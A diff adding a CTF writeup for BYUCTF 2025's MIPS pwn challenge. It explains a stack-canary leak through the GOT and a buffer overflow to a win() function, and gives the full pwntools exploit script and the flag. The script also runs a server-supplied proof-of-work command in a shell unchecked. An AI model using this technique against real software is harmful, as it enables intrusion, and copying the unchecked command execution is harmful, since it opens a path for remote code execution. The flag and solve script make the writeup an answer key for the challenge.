@@ -1,0 +1,152 @@
+---
+title: "MIPS — BYUCTF 2025"
+date: 2026-06-27
+author: "Imattas aka Zemi"
+slug: "byuctf-2025-mips"
+order: 270
+writeupKind: "challenge"
+ctfSlug: "byuctf-2025"
+ctfTitle: "BYUCTF 2025"
+---
+
+# MIPS — BYUCTF 2025
+
+> **Category:** `Binary Exploitation`  
+> **Author:** Imattas aka Zemi  
+> **Flag:** `byuctf{h0p3_y0u_d1dnt_h4v3_un1c0rn_2.1.3_cuz_M1PS_s3gf4ultz_th3r3}`  
+> **Source Path:** `pwn/mips`
+
+---
+
+## Challenge Description
+
+```text
+Pwn mains need to learn more about other architectures.
+
+`nc mips.chal.cyberjousting.com 1357`
+
+[mips.zip]
+```
+
+---
+
+## Provided Materials
+
+- [Repository folder](https://github.com/BYU-CSA/BYUCTF-2025/tree/main/pwn/mips)
+- [pwn/mips/README.md](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/mips/README.md)
+- [pwn/mips/mips.zip](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/mips/mips.zip)
+- [pwn/mips/solve.py](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/mips/solve.py)
+
+---
+
+## Recon / Initial Analysis
+
+This page imports the BYUCTF 2025 source material for the Binary Exploitation challenge **MIPS**. The prompt is kept separate from the solve notes, and upstream artifacts are linked so the challenge can be replayed from the original repository.
+
+---
+
+## Vulnerability / Observation
+
+The useful observation comes from the imported solve notes below. I kept the original technical path intact while normalizing the page metadata, challenge grouping, and author attribution for the Volume 2 writeup archive.
+
+---
+
+## Exploitation / Solution
+
+Source: [pwn/mips/README.md](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/mips/README.md)
+
+In x64, stack canaries are referenced as an offset to the `fs` register and I think are stored in TLS near the linker. However, in MIPS, the Global Offset Table contains a pointer to the stack canary. This is a stripped mipsel32 execute without PIE that contains a buffer overflow and 2 arbitrary reads (they specify the address and I print out the bytes). However, stack canaries are enabled, so the buffer overflow will fail without knowing the canary. They would probably think of doing GOT -> libc `environ` -> stack, but that requires **3** reads, not 2. Doing GOT -> canary will give them what they need, then they can exploit the overflow and go to the `win()` function.
+
+Note that exploit dev tooling kinda sucks for MIPS, and if they have the latest version of Unicorn installed (2.1.3), then any pwntools commands will cause Python to segfault. They'll get over it. I'm pulling the libraries from my own Docker container which they can see in the `Dockerfile`. There, they'll see what libc is being used, what qemu version is being used, that qemu has ASLR on, etc. A PoW was added to prevent brute forcing the canary address. Half of solving the problem is just figuring out how to run it on their own machine and learn what's going on.
+
+The solution is automated in `solve.py`.
+
+**Flag** - `byuctf{h0p3_y0u_d1dnt_h4v3_un1c0rn_2.1.3_cuz_M1PS_s3gf4ultz_th3r3}`
+
+---
+
+## Full Exploit Script
+
+Source: [pwn/mips/solve.py](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/mips/solve.py)
+
+```python
+from pwn import *
+from subprocess import getoutput
+
+
+build = 'mipsel32r5-glibc'
+binary = "./ctf/mips"
+elf = context.binary = ELF(binary, checksec=False)
+docker = ELF('/usr/bin/docker',checksec=False)
+
+gs = """
+set architecture mips:isa32r5
+break main
+b *0x400c88
+continue
+"""
+
+if args.REMOTE:
+    p = remote("mips.chal.cyberjousting.com", 1357)
+
+    ### SOLVE POW ###
+    p.recvline()
+    cmd = p.recvline().decode().strip()
+    print(f"Solving POW: {cmd}")
+    answer = getoutput(cmd)
+    p.sendline(answer.encode())
+elif args.GDB:
+    context.terminal = ["tmux", "splitw", "-h", "-l", "70%"]
+    p = docker.process(['run','-i','--rm','-v','./ctf:/target/ctf','-p','1234:1234',f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','-g','1234','/ctf/mips'])
+    print("Remote debugging started...")
+    gdb.attach(("127.0.0.1",1234), gdbscript=gs, exe=binary)
+else:
+    p = docker.process(['run','-i','--rm','-v','./ctf:/target/ctf',f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','/ctf/mips'])
+
+
+
+### GET CANARY ###
+canary_got_addr = 0x420060
+canary_ld_offset = 0x3fef4
+
+p.recvuntil(b'> ')
+p.sendline(b'1')
+p.sendline(hex(canary_got_addr).encode())
+
+canary_addr = int(p.recvline().strip().split(b' ')[-1],16)
+print(f"Canary GOT: {hex(canary_got_addr)}")
+ld_base = canary_addr - canary_ld_offset
+print(f"Linker base: {hex(ld_base)}")
+
+p.recvuntil(b'> ')
+p.sendline(b'1')
+p.sendline(hex(canary_addr).encode())
+canary = int(p.recvline().strip().split(b' ')[-1],16)
+print(f"Canary: {hex(canary)}")
+
+
+
+
+### EXPLOIT OVERFLOW ###
+p.recvuntil(b'> ')
+p.sendline(b'2')
+
+payload = flat(
+    b'A'*0x10,                              # padding
+    p32(canary),                            # canary
+    p32(0),                                 # s8
+    p32(0x400964),                          # ra (win())
+)
+p.sendline(payload)
+
+
+p.interactive()
+```
+
+---
+
+## Key Takeaways
+
+- The BYUCTF 2025 challenge material is preserved with local archive formatting.
+- The page author is normalized to Imattas aka Zemi.
+- The source repository remains linked for handouts, services, and solve artifacts.
